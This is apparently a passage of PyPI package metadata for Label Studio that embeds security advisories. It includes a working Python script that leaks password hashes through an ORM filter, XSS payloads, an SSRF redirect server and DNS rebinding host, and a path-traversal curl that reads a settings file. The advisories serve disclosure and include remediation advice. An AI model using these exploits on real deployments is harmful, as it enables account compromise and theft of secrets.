{\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.4":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.4/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","google-cloud-logging (==2.6.0)","Django (==3.1.13)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.4.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.10.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","label-studio-converter (==0.0.36)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.4","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"bda639a6f60c7e8994e514584ad6716a57824fc0d0d5373d5921b6683465145b","md5":"241b9326e1af69e203fb965c6b2fc804","sha256":"03395242112a6b4efc96df55afeced439e20e925372f59086faeded2d85b7a76"},"downloads":-1,"filename":"label_studio-1.4-py3-none-any.whl","has_sig":false,"md5_digest":"241b9326e1af69e203fb965c6b2fc804","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":47182889,"upload_time":"2021-11-19T15:55:46","upload_time_iso_8601":"2021-11-19T15:55:46.516554Z","url":"https://files.pythonhosted.org/packages/bd/a6/39a6f60c7e8994e514584ad6716a57824fc0d0d5373d5921b6683465145b/label_studio-1.4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"4c18e2dadfd579565eb4c23fbb09dfadd3d9db0326e571b70522825069999df3","md5":"b18663dcde027b89528d46a80f70f026","sha256":"8c29ea7054424a7854a9cbea37728d3be0b6abd44cbea51604d8c6eb0cdadb1e"},"downloads":-1,"filename":"label-studio-1.4.tar.gz","has_sig":false,"md5_digest":"b18663dcde027b89528d46a80f70f026","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":46704089,"upload_time":"2021-11-19T15:56:02","upload_time_iso_8601":"2021-11-19T15:56:02.356161Z","url":"https://files.pythonhosted.org/packages/4c/18/e2dadfd579565eb4c23fbb09dfadd3d9db0326e571b70522825069999df3/label-studio-1.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the 